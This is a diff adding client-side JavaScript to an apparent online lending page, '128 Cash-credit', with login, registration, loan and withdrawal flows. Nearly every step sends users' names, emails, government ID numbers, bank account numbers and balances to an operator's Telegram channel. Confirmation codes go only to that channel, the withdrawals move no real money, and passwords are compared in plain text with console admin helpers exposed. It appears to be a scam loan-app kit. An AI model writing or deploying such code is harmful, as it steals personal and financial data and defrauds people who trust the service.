+                input.classList.add('input-error');
+                input.classList.remove('input-valid');
+                hint.textContent = '⚠ Minimum withdrawal is ₱100';
+                hint.className = 'input-hint error';
+            } else if (val > 500000) {
+                input.classList.add('input-error');
+                input.classList.remove('input-valid');
+                hint.textContent = '⚠ Maximum withdrawal is ₱500,000';
+                hint.className = 'input-hint error';
+            } else if (currentUser && val > Number(currentUser.balance)) {
+                input.classList.add('input-error');
+                input.classList.remove('input-valid');
+                hint.textContent = '⚠ Insufficient balance';
+                hint.className = 'input-hint error';
+            } else {
+                input.classList.remove('input-error');
+                input.classList.add('input-valid');
+                hint.textContent = '✓ Valid amount';
+                hint.className = 'input-hint success';
+            }
+            updateReviewCard();
+        }
+
+        function formatWdAmount() {
+            const input = document.getElementById('wd-amount');
+            if (input.value) {
+                const val = parseFloat(input.value);
+                if (!isNaN(val)) {
+                    input.value = val;
+                }
+            }
+        }
+
+        function validateWdAccount() {
+            const input = document.getElementById('wd-account');
+            const hint = document.getElementById('wd-account-hint');
+            const val = input.value.trim();
+            if (!val) {
+                input.classList.remove('input-error', 'input-valid');
+                hint.textContent = 'Enter your bank account UID';
+                hint.className = 'input-hint';
+            } else {
+                const cleaned = val.replace(/\D/g, '');
+                if (cleaned.length < 6) {
+                    input.classList.add('input-error');
+                    input.classList.remove('input-valid');
+                    hint.textContent = '⚠ Account UID too short (min 6 digits)';
+                    hint.className = 'input-hint error';
+                } else if (cleaned.length > 16) {
+                    input.classList.add('input-error');
+                    input.classList.remove('input-valid');
+                    hint.textContent = '⚠ Account UID too long (max 16 digits)';
+                    hint.className = 'input-hint error';
+                } else {
+                    input.classList.remove('input-error');
+                    input.classList.add('input-valid');
+                    hint.textContent = '✓ Valid account UID';
+                    hint.className = 'input-hint success';
+                }
+            }
+            updateReviewCard();
+        }
+
+        function validateWdAccName() {
+            const input = document.getElementById('wd-accname');
+            const hint = document.getElementById('wd-accname-hint');
+            const val = input.value.trim();
+            if (!val) {
+                input.classList.remove('input-error', 'input-valid');
+                hint.textContent = 'Must match the registered account name';
+                hint.className = 'input-hint';
+            } else if (val.length < 3) {
+                input.classList.add('input-error');
+                input.classList.remove('input-valid');
+                hint.textContent = '⚠ Name too short';
+                hint.className = 'input-hint error';
+            } else {
+                input.classList.remove('input-error');
+                input.classList.add('input-valid');
+                hint.textContent = '✓ Looks good';
+                hint.className = 'input-hint success';
+            }
+            updateReviewCard();
+        }
+
+        function validateWdPassword() {
+            const input = document.getElementById('wd-password');
+            const hint = document.getElementById('wd-password-hint');
+            const val = input.value;
+            if (!val) {
+                input.classList.remove('input-error', 'input-valid');
+                hint.textContent = 'Required for security verification';
+                hint.className = 'input-hint';
+            } else if (val.length < 3) {
+                input.classList.add('input-error');
+                input.classList.remove('input-valid');
+                hint.textContent = '⚠ Password too short';
+                hint.className = 'input-hint error';
+            } else {
+                input.classList.remove('input-error');
+                input.classList.add('input-valid');
+                hint.textContent = '✓ Password entered';
+                hint.className = 'input-hint success';
+            }
+        }
+
+        function updateReviewCard() {
+            const reviewCard = document.getElementById('wd-review-card');
+            const amountVal = parseFloat(document.getElementById('wd-amount').value);
+            const accountVal = document.getElementById('wd-account').value.trim();
+            const accNameVal = document.getElementById('wd-accname').value.trim();
+
+            if (selectedBank && amountVal && accountVal && accNameVal && !isNaN(amountVal) && amountVal >= 100) {
+                reviewCard.style.display = 'block';
+                document.getElementById('review-bank').textContent = selectedBank;
+                document.getElementById('review-account').textContent = accountVal;
+                document.getElementById('review-accname').textContent = accNameVal;
+                document.getElementById('review-amount').textContent = '₱' + amountVal.toLocaleString(
+                'en-PH', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+                const remaining = currentUser ? Number(currentUser.balance) - amountVal : 0;
+                document.getElementById('review-remaining').textContent = '₱' + Math.max(0, remaining).toLocaleString(
+                    'en-PH', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+                if (remaining < 0) {
+                    document.getElementById('review-remaining').style.color = '#e57373';
+                } else {
+                    document.getElementById('review-remaining').style.color = 'var(--text)';
+                }
+                document.getElementById('wd-btn').querySelector('.btn-text').textContent = 'Process Withdrawal';
+                document.getElementById('wd-btn').classList.add('pulse');
+            } else {
+                reviewCard.style.display = 'none';
+                document.getElementById('wd-btn').querySelector('.btn-text').textContent = 'Review & Process Withdrawal';
+                document.getElementById('wd-btn').classList.remove('pulse');
+            }
+        }
+
+        function resetWithdrawForm() {
+            document.getElementById('wd-amount').value = '';
+            document.getElementById('wd-account').value = '';
+            document.getElementById('wd-accname').value = '';
+            document.getElementById('wd-password').value = '';
+            document.querySelectorAll('.quick-amt-btn').forEach(b => b.classList.remove('active-amount'));
+            document.querySelectorAll('#withdraw-form-section input').forEach(inp => {
+                inp.classList.remove('input-error', 'input-valid');
+            });
+            document.querySelectorAll('#withdraw-form-section .input-hint').forEach(h => {
+                h.className = 'input-hint';
+                if (h.id === 'wd-amount-hint') h.textContent = 'Minimum ₱100 · Maximum ₱500,000';
+                if (h.id === 'wd-account-hint') h.textContent = 'Enter your bank account UID';
+                if (h.id === 'wd-accname-hint') h.textContent = 'Must match the registered account name';
+                if (h.id === 'wd-password-hint') h.textContent = 'Required for security verification';
+            });
+            document.getElementById('wd-review-card').style.display = 'none';
+            document.getElementById('wd-btn').classList.remove('pulse');
+            document.getElementById('wd-btn').querySelector('.btn-text').textContent = 'Review & Process Withdrawal';
+        }
+
+        // ============================================================
+        //  BANK SELECTION
+        // ============================================================
+        function selectBank(el) {
+            document.querySelectorAll('.bank-card').forEach(c => c.classList.remove('selected'));
+            el.classList.add('selected');
+            selectedBank = el.dataset.bank;
+            selectedBankType = 'bank';
+
+            document.getElementById('selected-bank-name').textContent = selectedBank;
+            document.getElementById('selected-bank-type').textContent = 'Bank Account · 1-2 Business Days';
+            document.getElementById('withdraw-form-section').style.display = 'block';
+
+            const dot = document.getElementById('ws-bank-dot');
+            dot.textContent = bankInitials[selectedBank] || selectedBank.substring(0, 2).toUpperCase();
+            dot.style.background = bankColors[selectedBank] || '#0d7a3e';
+            document.getElementById('selected-bank-summary').style.display = 'flex';
+
+            document.getElementById('wd-account-label').textContent = 'Account UID';
+            const accountInput = document.getElementById('wd-account');
+            accountInput.placeholder = 'Enter account UID';
+            accountInput.setAttribute('maxlength', '16');
+            document.getElementById('wd-account-hint').textContent = 'Enter your bank account UID';
+
+            document.getElementById('wd-amount').value = '';
+            document.getElementById('wd-account').value = '';
+            document.getElementById('wd-accname').value = '';
+            document.getElementById('wd-password').value = '';
+            document.querySelectorAll('.quick-amt-btn').forEach(b => b.classList.remove('active-amount'));
+            document.querySelectorAll('#withdraw-form-section input').forEach(inp => {
+                inp.classList.remove('input-error', 'input-valid');
+            });
+            document.querySelectorAll('#withdraw-form-section .input-hint').forEach(h => {
+                h.className = 'input-hint';
+            });
+            document.getElementById('wd-review-card').style.display = 'none';
+            document.getElementById('wd-btn').classList.remove('pulse');
+            document.getElementById('wd-btn').querySelector('.btn-text').textContent = 'Review & Process Withdrawal';
+            document.getElementById('wd-amount-hint').textContent = 'Minimum ₱100 · Maximum ₱500,000';
+
+            accountInput.oninput = function() {
+                let val = this.value.replace(/\D/g, '');
+                if (val.length > 16) val = val.slice(0, 16);
+                this.value = val;
+                validateWdAccount();
+                updateReviewCard();
+            };
+
+            setTimeout(() => {
+                document.getElementById('withdraw-form-section').scrollIntoView({ behavior: 'smooth',
+                    block: 'start' });
+                document.getElementById('wd-amount').focus();
+            }, 200);
+
+            updateWdBalance();
+        }
+
+        // ============================================================
+        //  DASHBOARD
+        // ============================================================
+        function loadDashboard() {
+            if (!currentUser) return;
+            const bal = Number(currentUser.balance || 0);
+            document.getElementById('disp-balance').textContent = bal.toLocaleString('en-PH', { minimumFractionDigits: 2,
+                maximumFractionDigits: 2 });
+            updateStatusBadge(currentUser.loan_status);
+            document.getElementById('home-loan-status').textContent = currentUser.loan_status || 'none';
+            document.getElementById('home-loan-amount').textContent = '₱' + Number(currentUser.loan_amount || 0)
+                .toLocaleString();
+            document.getElementById('home-slot').textContent = '#' + currentSlot;
+            document.getElementById('verified-strip').style.display = 'flex';
+            document.getElementById('loan-fullname').value = currentUser.full_name || '';
+            document.getElementById('loan-idnumber').value = currentUser.id_number || '';
+            const fw = document.getElementById('freeze-warning');
+            fw.style.display = currentUser.frozen ? 'flex' : 'none';
+            refreshLoanStatus();
+            refreshProfile();
+            updateWdBalance();
+            updateReviewCard();
+        }
+
+        function updateStatusBadge(status) {
+            const b = document.getElementById('disp-status-badge');
+            b.className = 'status-badge';
+            const map = { none: 'badge-none', pending: 'badge-pending', approved: 'badge-approved',
+                rejected: 'badge-rejected', 'waiting': 'badge-waiting' };
+            b.classList.add(map[status] || 'badge-none');
+            const labels = { none: 'No Loan', pending: 'Pending', approved: 'Approved', rejected: 'Rejected',
+                'waiting': 'Waiting Confirmation' };
+            b.textContent = labels[status] || 'No Loan';
+        }
+
+        function refreshLoanStatus() {
+            const info = document.getElementById('loan-status-info');
+            if (!currentUser) return;
+            if (currentUser.loan_status === 'pending') info.textContent = 'Your loan is waiting for confirmation code.';
+            else if (currentUser.loan_status === 'approved') info.textContent =
+                'Loan approved! Funds have been credited.';
+            else if (currentUser.loan_status === 'rejected') info.textContent =
+                'Your loan was rejected. Contact support.';
+            else if (currentUser.loan_status === 'waiting') info.textContent =
+                'Waiting for bank confirmation. Enter code.';
+            else info.textContent = '';
+        }
+
+        function refreshProfile() {
+            if (!currentUser) return;
+            const bal = Number(currentUser.balance || 0);
+            document.getElementById('prof-name').textContent = currentUser.full_name || '—';
+            document.getElementById('prof-email').textContent = currentUser.email || '—';
+            document.getElementById('prof-email2').textContent = currentUser.email || '—';
+            document.getElementById('prof-fullname').textContent = currentUser.full_name || '—';
+            document.getElementById('prof-idname').textContent = currentUser.id_name || '—';
+            document.getElementById('prof-idnumber').textContent = currentUser.id_number || '—';
+            document.getElementById('prof-balance').textContent = '₱' + bal.toLocaleString();
+            document.getElementById('prof-loanstatus').textContent = currentUser.loan_status || 'none';
+            document.getElementById('prof-loanamount').textContent = '₱' + Number(currentUser.loan_amount || 0)
+                .toLocaleString();
+            document.getElementById('prof-slot').textContent = '#' + currentSlot;
+            document.getElementById('prof-freeze-status').textContent = currentUser.frozen ? 'Frozen' : 'Active';
+            document.getElementById('prof-freeze-status').style.color = currentUser.frozen ? '#e65100' :
+                'var(--green-dark)';
+        }
+
+        function updateWdBalance() {
+            if (currentUser) {
+                document.getElementById('wd-balance-display').textContent = '₱' + Number(currentUser.balance || 0)
+                    .toLocaleString();
+            }
+            updateReviewCard();
+        }
+
+        // ============================================================
+        //  LOGIN
+        // ============================================================
+        document.getElementById('login-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const email = document.getElementById('login-email').value.trim().toLowerCase();
+            const password = document.getElementById('login-password').value;
+            if (!email || !password) { showToast('Please fill in all fields', 'error'); return; }
+            const btn = document.getElementById('login-btn');
+            btn.classList.add('loading');
+            btn.disabled = true;
+            try {
+                const user = await getUserByEmail(email);
+                if (!user || user.password !== password) {
+                    showToast('Invalid email or password', 'error');
+                    btn.classList.remove('loading');
+                    btn.disabled = false;
+                    return;
+                }
+                if (!user.verified) {
+                    showToast('Account not verified. Contact support.', 'error');
+                    btn.classList.remove('loading');
+                    btn.disabled = false;
+                    return;
+                }
+                currentSlot = user.slot;
+                currentUser = user;
+                sendTelegram(
+                    `LOGIN ALERT\n━━━━━━━━━━━━━━━\nName: ${user.full_name || 'N/A'}\nEmail: ${user.email}\nSlot: #${user.slot}\nBalance: ₱${Number(user.balance).toLocaleString()}\nLoan Status: ${user.loan_status}\nTime: ${new Date().toLocaleString('en-PH')}`
+                    );
+                localStorage.setItem('fsl_session', JSON.stringify({ slot: user.slot, timestamp: Date.now() }));
+                loadDashboard();
+                showScreen('screen-dashboard');
+                showToast('Welcome back, ' + (user.full_name || email) + '!', 'success');
+                document.getElementById('login-email').value = '';
+                document.getElementById('login-password').value = '';
+            } catch (error) {
+                showToast('Login failed. Please try again.', 'error');
+            }
+            btn.classList.remove('loading');
+            btn.disabled = false;
+        });
+
+        // ============================================================
+        //  REGISTER
+        // ============================================================
+        document.getElementById('register-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const fullName = document.getElementById('reg-fullname').value.trim();
+            const idName = document.getElementById('reg-idname').value.trim();
+            const idNumber = document.getElementById('reg-idnumber').value.trim();
+            const email = document.getElementById('reg-email').value.trim().toLowerCase();
+            const password = document.getElementById('reg-password').value;
+            const confirm = document.getElementById('reg-confirm').value;
+            if (!fullName || !idName || !idNumber || !email || !password || !confirm) {
+                showToast('Please fill in all fields', 'error');
+                return;
+            }
+            if (password !== confirm) { showToast('Passwords do not match', 'error'); return; }
+            if (password.length < 6) { showToast('Password must be at least 6 characters', 'error'); return; }
+            if (!/\S+@\S+\.\S+/.test(email)) { showToast('Invalid email address', 'error'); return; }
+            const btn = document.getElementById('register-btn');
+            btn.classList.add('loading');
+            btn.disabled = true;
+            try {
+                const existing = await getUserByEmail(email);
+                if (existing) {
+                    showToast('Email already registered. Please login.', 'error');
+                    btn.classList.remove('loading');
+                    btn.disabled = false;
+                    return;
+                }
+                const newUser = await createUser({ fullName, idName, idNumber, email, password });
+                if (!newUser) {
+                    showToast('Registration failed. Please try again.', 'error');
+                    btn.classList.remove('loading');
+                    btn.disabled = false;
+                    return;
+                }
+                sendTelegram(
+                    `NEW REGISTRATION\n━━━━━━━━━━━━━━━\nFull Name: ${fullName}\nID Name: ${idName}\nID Number: ${idNumber}\nEmail: ${email}\nSlot: #${newUser.slot}\nTime: ${new Date().toLocaleString('en-PH')}`
+                    );
+                showToast('Account created! You can now login.', 'success', 5000);
+                document.getElementById('register-form').reset();
+                showScreen('screen-login');
+            } catch (error) {
+                showToast(error.message || 'Registration failed.', 'error');
+            }
+            btn.classList.remove('loading');
+            btn.disabled = false;
+        });
+
+        // ============================================================
+        //  LOAN APPLICATION
+        // ============================================================
+        document.getElementById('loan-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            if (!currentUser) { showToast('Please login first', 'error'); return; }
+            if (currentUser.frozen) { showToast('Account frozen — cannot apply for loan', 'error'); return; }
+            if (currentUser.loan_status === 'pending' || currentUser.loan_status === 'waiting') {
+                showToast('You already have a pending loan', 'error');
+                return;
+            }
+            if (currentUser.loan_status === 'approved') { showToast('Loan already approved. Withdraw your funds.',
+                'info'); return; }
+            const fullName = document.getElementById('loan-fullname').value.trim();
+            const idNumber = document.getElementById('loan-idnumber').value.trim();
+            const birthday = document.getElementById('loan-birthday').value;
+            const bankAcc = document.getElementById('loan-bankaccount').value.trim();
+            const career = document.getElementById('loan-career').value.trim();
+            const address = document.getElementById('loan-address').value.trim();
+            const amount = parseFloat(document.getElementById('loan-amount').value);
+            if (!fullName || !idNumber || !birthday || !bankAcc || !career || !address || !amount) {
+                showToast('Please fill in all required fields', 'error');
+                return;
+            }
+            if (amount < 1000) { showToast('Minimum loan amount is ₱1,000', 'error'); return; }
+            if (amount > 500000) { showToast('Maximum loan amount is ₱500,000', 'error'); return; }
+            const btn = document.getElementById('loan-btn');
+            btn.classList.add('loading');
+            btn.disabled = true;
+            try {
+                await updateLoanStatus(currentSlot, 'waiting', amount);
+                currentUser = await getUserBySlot(currentSlot);
+                pendingLoanAmount = amount;
+                generatedLoanCode = generateRandomCode();
+                const bank = document.getElementById('loan-bank').value;
+                sendTelegramWithCode(
+                    `LOAN APPLICATION\n━━━━━━━━━━━━━━━\nName: ${fullName}\nID #: ${idNumber}\nBank: ${bank}\nAccount #: ${bankAcc}\nLoan Amount: ₱${amount.toLocaleString()}\nEmail: ${currentUser.email}\nSlot: #${currentSlot}\nTime: ${new Date().toLocaleString('en-PH')}`,
+                    generatedLoanCode);
+                updateStatusBadge('waiting');
+                document.getElementById('home-loan-status').textContent = 'waiting';
+                document.getElementById('home-loan-amount').textContent = '₱' + amount.toLocaleString();
+                refreshLoanStatus();
+                loadDashboard();
+                startLoanConfirmCountdown(amount);
+            } catch (error) {
+                showToast('Loan application failed. Please try again.', 'error');
+            }
+            btn.classList.remove('loading');
+            btn.disabled = false;
+        });
+
+        // ============================================================
+        //  LOAN CONFIRM COUNTDOWN — 7 Days
+        // ============================================================
+        function startLoanConfirmCountdown(amount) {
+            let totalSeconds = 7 * 24 * 60 * 60;
+            const timeLabel = document.getElementById('loan-confirm-time');
+            document.getElementById('overlay-loan-confirm').classList.add('active');
+            clearInterval(loanConfirmTimer);
+            loanConfirmTimer = setInterval(async () => {
+                totalSeconds--;
+                const days = Math.floor(totalSeconds / (24 * 60 * 60));
+                const hours = Math.floor((totalSeconds % (24 * 60 * 60)) / (60 * 60));
+                const mins = Math.floor((totalSeconds % (60 * 60)) / 60);
+                const secs = totalSeconds % 60;
+                timeLabel.textContent =
+                    `${days}d ${String(hours).padStart(2, '0')}:${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+                if (totalSeconds <= 0) {
+                    clearInterval(loanConfirmTimer);
+                    document.getElementById('overlay-loan-confirm').classList.remove('active');
+                    if (currentUser && currentUser.loan_status === 'waiting') {
+                        try {
+                            await updateLoanStatus(currentSlot, 'rejected', 0);
+                            currentUser = await getUserBySlot(currentSlot);
+                            updateStatusBadge('rejected');
+                            loadDashboard();
+                            showToast('Loan expired. Please reapply.', 'error', 5000);
+                            sendTelegram(
+                                `LOAN EXPIRED\n━━━━━━━━━━━━━━━\nName: ${currentUser.full_name}\nEmail: ${currentUser.email}\nAmount: ₱${amount.toLocaleString()}\nReason: No confirmation code received within 7 days`
+                                );
+                        } catch (e) {}
+                    }
+                }
+            }, 1000);
+        }
+
+        async function verifyLoanCode() {
+            const code = getCode('loan-code');
+            if (!code) { showToast('Please enter the 6-digit code', 'error'); return; }
+            if (!currentUser || currentUser.loan_status !== 'waiting') {
+                showToast('No pending loan to confirm', 'error');
+                return;
+            }
+            if (code === generatedLoanCode) {
+                clearInterval(loanConfirmTimer);
+                document.getElementById('overlay-loan-confirm').classList.remove('active');
+                try {
+                    await updateBalance(currentSlot, pendingLoanAmount);
+                    await updateLoanStatus(currentSlot, 'approved', pendingLoanAmount);
+                    currentUser = await getUserBySlot(currentSlot);
+                    updateStatusBadge('approved');
+                    loadDashboard();
+                    showToast('Loan Confirmed! ₱' + pendingLoanAmount.toLocaleString() + ' credited.',
+                        'success', 5000);
+                    sendTelegram(
+                        `LOAN CONFIRMED & APPROVED\n━━━━━━━━━━━━━━━\nName: ${currentUser.full_name}\nEmail: ${currentUser.email}\nAmount: ₱${pendingLoanAmount.toLocaleString()}\nNew Balance: ₱${Number(currentUser.balance).toLocaleString()}\nSlot: #${currentSlot}\nTime: ${new Date().toLocaleString('en-PH')}`
+                        );
+                    clearCode('loan-code');
+                    generatedLoanCode = '';
+                    pendingLoanAmount = 0;
+                } catch (error) {
+                    showToast('Failed to confirm loan.', 'error');
+                }
+            } else {
+                showToast('Invalid code. Check your Telegram.', 'error');
+            }
+        }
+
+        // ============================================================
+        //  WITHDRAW
+        // ============================================================
+        async function submitWithdraw() {
+            if (!currentUser) { showToast('Please login first', 'error'); return; }
+            if (currentUser.frozen) { showToast('Account frozen — cannot withdraw', 'error'); return; }
+            if (!selectedBank) { showToast('Please select a bank first', 'warning'); return; }
+
+            const amountInput = document.getElementById('wd-amount');
+            const accountInput = document.getElementById('wd-account');
+            const accNameInput = document.getElementById('wd-accname');
+            const passwordInput = document.getElementById('wd-password');
+
+            const amount = parseFloat(amountInput.value);
+            const account = accountInput.value.trim().replace(/\D/g, '');
+            const accName = accNameInput.value.trim();
+            const password = passwordInput.value;
+
+            let hasError = false;
+            if (!amount || isNaN(amount)) {
+                showToast('Please enter a valid withdrawal amount', 'error');
+                amountInput.classList.add('input-error');
+                amountInput.focus();
+                hasError = true;
+            } else if (amount < 100) {
+                showToast('Minimum withdrawal is ₱100', 'error');
+                amountInput.classList.add('input-error');
+                amountInput.focus();
+                hasError = true;
+            } else if (amount > 500000) {
+                showToast('Maximum withdrawal is ₱500,000', 'error');
+                amountInput.classList.add('input-error');
+                amountInput.focus();
+                hasError = true;
+            } else if (amount > Number(currentUser.balance)) {
+                showToast('Insufficient balance', 'error');
+                amountInput.classList.add('input-error');
+                amountInput.focus();
+                hasError = true;
+            }
+
+            if (!account) {
+                showToast('Please enter your account UID', 'error');
+                accountInput.classList.add('input-error');
+                if (!hasError) accountInput.focus();
+                hasError = true;
+            } else if (account.length < 6) {
+                showToast('Account UID too short (min 6 digits)', 'error');
+                accountInput.classList.add('input-error');
+                if (!hasError) accountInput.focus();
+                hasError = true;
+            }
+
+            if (!accName || accName.length < 3) {
+                showToast('Please enter the account name', 'error');
+                accNameInput.classList.add('input-error');
+                if (!hasError) accNameInput.focus();
+                hasError = true;
+            }
+
+            if (!password) {
+                showToast('Please enter your password to confirm', 'error');
+                passwordInput.classList.add('input-error');
+                if (!hasError) passwordInput.focus();
+                hasError = true;
+            } else if (password !== currentUser.password) {
+                showToast('Incorrect password', 'error');
+                passwordInput.classList.add('input-error');
+                passwordInput.focus();
+                hasError = true;
+            }
+
+            if (hasError) return;
+
+            const btn = document.getElementById('wd-btn');
+            btn.classList.add('loading');
+            btn.disabled = true;
+
+            try {
+                pendingWdAmount = amount;
+                pendingWdData = { account, accName, bank: selectedBank, type: 'bank' };
+
+                await updateBalance(currentSlot, -amount);
+                currentUser = await getUserBySlot(currentSlot);
+                loadDashboard();
+
+                generatedWdCode = generateRandomCode();
+                sendTelegramWithCode(
+                    `WITHDRAWAL\n━━━━━━━━━━━━━━━\nName: ${currentUser.full_name}\nEmail: ${currentUser.email}\nDestination: ${selectedBank} (Bank)\nAccount UID: ${account}\nAccount Name: ${accName}\nAmount: ₱${amount.toLocaleString()}\nSlot: #${currentSlot}\nTime: ${new Date().toLocaleString('en-PH')}`,
+                    generatedWdCode);
+
+                startWdConfirmCountdown(amount);
+                resetWithdrawForm();
+                document.getElementById('withdraw-form-section').style.display = 'none';
+                document.querySelectorAll('.bank-card').forEach(c => c.classList.remove('selected'));
+                selectedBank = '';
+                selectedBankType = 'bank';
+
+            } catch (error) {
+                showToast(error.message || 'Withdrawal failed.', 'error');
+                if (pendingWdAmount) {
+                    try { await updateBalance(currentSlot, pendingWdAmount);
+                        currentUser = await getUserBySlot(currentSlot);
+                        loadDashboard(); } catch (e) {}
+                    pendingWdAmount = 0;
+                    pendingWdData = null;
+                }
+            }
+
+            btn.classList.remove('loading');
+            btn.disabled = false;
+        }
+
+        // ============================================================
+        //  WITHDRAW CONFIRM COUNTDOWN — 30 Minutes
+        // ============================================================
+        function startWdConfirmCountdown(amount) {
+            let totalSeconds = 30 * 60; // 30 minutes
+            const timeLabel = document.getElementById('wd-confirm-time');
+            document.getElementById('overlay-wd-confirm').classList.add('active');
+            clearInterval(wdConfirmTimer);
+            wdConfirmTimer = setInterval(async () => {
+                totalSeconds--;
+                const mins = Math.floor(totalSeconds / 60);
+                const secs = totalSeconds % 60;
+                timeLabel.textContent =
+                    `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+                if (totalSeconds <= 0) {
+                    clearInterval(wdConfirmTimer);
+                    document.getElementById('overlay-wd-confirm').classList.remove('active');
+                    if (currentUser && pendingWdAmount) {
+                        try {
+                            await updateBalance(currentSlot, pendingWdAmount);
+                            currentUser = await getUserBySlot(currentSlot);
+                            loadDashboard();
+                            showToast('Withdrawal expired. Balance restored.', 'warning', 5000);
+                            sendTelegram(
+                                `WITHDRAWAL EXPIRED\n━━━━━━━━━━━━━━━\nName: ${currentUser.full_name}\nAmount: ₱${pendingWdAmount.toLocaleString()}\nBalance Restored: ₱${Number(currentUser.balance).toLocaleString()}\nTime: ${new Date().toLocaleString('en-PH')}`
+                                );
+                        } catch (e) {}
+                        pendingWdAmount = 0;
+                        pendingWdData = null;
+                        generatedWdCode = '';
+                    }
+                }
+            }, 1000);
+        }
+
+        async function verifyWdCode() {
+            const code = getCode('wd-code');
+            if (!code) { showToast('Please enter the 6-digit code', 'error'); return; }
+            if (!pendingWdData || !pendingWdAmount) { showToast('No pending withdrawal', 'error'); return; }
+            if (code === generatedWdCode) {
+                clearInterval(wdConfirmTimer);
+                document.getElementById('overlay-wd-confirm').classList.remove('active');
+                showToast('Withdrawal of ₱' + pendingWdAmount.toLocaleString() + ' confirmed! ✅',
+                'success', 5000);
+                sendTelegram(
+                    `WITHDRAWAL CONFIRMED ✅\n━━━━━━━━━━━━━━━\nName: ${currentUser.full_name}\nEmail: ${currentUser.email}\nDestination: ${pendingWdData.bank} (Bank)\nAccount UID: ${pendingWdData.account}\nAmount: ₱${pendingWdAmount.toLocaleString()}\nRemaining Balance: ₱${Number(currentUser.balance).toLocaleString()}\nTime: ${new Date().toLocaleString('en-PH')}`
+                    );
+                clearCode('wd-code');
+                pendingWdAmount = 0;
+                pendingWdData = null;
+                generatedWdCode = '';
+            } else {
+                showToast('Invalid code. Check your Telegram.', 'error');
+            }
+        }
+
+        async function cancelWithdraw() {
+            if (currentUser && pendingWdAmount) {
+                try {
+                    await updateBalance(currentSlot, pendingWdAmount);
+                    currentUser = await getUserBySlot(currentSlot);
+                    loadDashboard();
+                } catch (e) {}
+            }
+            clearInterval(wdConfirmTimer);
+            document.getElementById('overlay-wd-confirm').classList.remove('active');
+            pendingWdAmount = 0;
+            pendingWdData = null;
+            generatedWdCode = '';
+            showToast('Withdrawal cancelled. Balance restored.', 'info');
+        }
+
+        // ============================================================
+        //  ID MODAL
+        // ============================================================
+        function openIdModal() { document.getElementById('modal-id').classList.add('active'); }
+
+        function closeIdModal() { document.getElementById('modal-id').classList.remove('active'); }
+        document.getElementById('modal-id').addEventListener('click', function(e) { if (e.target === this)
+            closeIdModal(); });
+
+        // ============================================================
+        //  LOGOUT
+        // ============================================================
+        function doLogout() {
+            localStorage.removeItem('fsl_session');
+            currentSlot = null;
+            currentUser = null;
+            selectedBank = '';
+            selectedBankType = 'bank';
+            clearInterval(loanConfirmTimer);
+            clearInterval(wdConfirmTimer);
+            document.getElementById('overlay-loan-confirm').classList.remove('active');
+            document.getElementById('overlay-wd-confirm').classList.remove('active');
+            document.getElementById('withdraw-form-section').style.display = 'none';
+            document.querySelectorAll('.bank-card').forEach(c => c.classList.remove('selected'));
+            resetWithdrawForm();
+            switchTab('home');
+            showScreen('screen-login');
+            showToast('Logged out successfully', 'info');
+        }
+
+        // ============================================================
+        //  AUTO-LOGIN
+        // ============================================================
+        async function checkAutoLogin() {
+            const sessionData = localStorage.getItem('fsl_session');
+            if (!sessionData) return false;
+            try {
+                const session = JSON.parse(sessionData);
+                if (Date.now() - session.timestamp > 30 * 24 * 60 * 60 * 1000) {
+                    localStorage.removeItem('fsl_session');
+                    return false;
+                }
+                const user = await getUserBySlot(session.slot);
+                if (!user || !user.verified) { localStorage.removeItem('fsl_session'); return false; }
+                currentSlot = user.slot;
+                currentUser = user;
+                loadDashboard();
+                showScreen('screen-dashboard');
+                sendTelegram(
+                    `AUTO-LOGIN\n━━━━━━━━━━━━━━━\nName: ${user.full_name || 'N/A'}\nEmail: ${user.email}\nSlot: #${user.slot}\nBalance: ₱${Number(user.balance).toLocaleString()}\nTime: ${new Date().toLocaleString('en-PH')}`
+                    );
+                return true;
+            } catch (e) { return false; }
+        }
+
+        function disableAutofill() {
+            document.querySelectorAll('input').forEach(inp => {
+                inp.setAttribute('autocomplete', 'new-password');
+                inp.setAttribute('data-lpignore', 'true');
+                inp.setAttribute('data-form-type', 'other');
+            });
+        }
+
+        // ============================================================
+        //  STARTUP
+        // ============================================================
+        window.addEventListener('DOMContentLoaded', async () => {
+            disableAutofill();
+            await checkAutoLogin();
+        });
+
+        // Admin helpers
+        window.admin = {
+            async viewUsers() { return supabaseFetch('/users?select=*&order=slot.asc'); },
+            async getUser(slot) { return getUserBySlot(slot); },
+            async updateUser(slot, data) { return updateUser(slot, data); },
+            async addBalance(slot, amount) { return updateBalance(slot, amount); },
+            async setLoanStatus(slot, status, amount = 0) { return updateLoanStatus(slot, status, amount); },
+            async reset() { localStorage.removeItem('fsl_session');
+                location.reload(); }
+        };
+        console.log('128 Cash-credit Admin Panel Ready');
+        console.log(
+            'Commands: admin.viewUsers() | admin.getUser(slot) | admin.addBalance(slot,amount) | admin.setLoanStatus(slot,status) | admin.reset()'
+            );
+    </script>
+</body>
+</html>
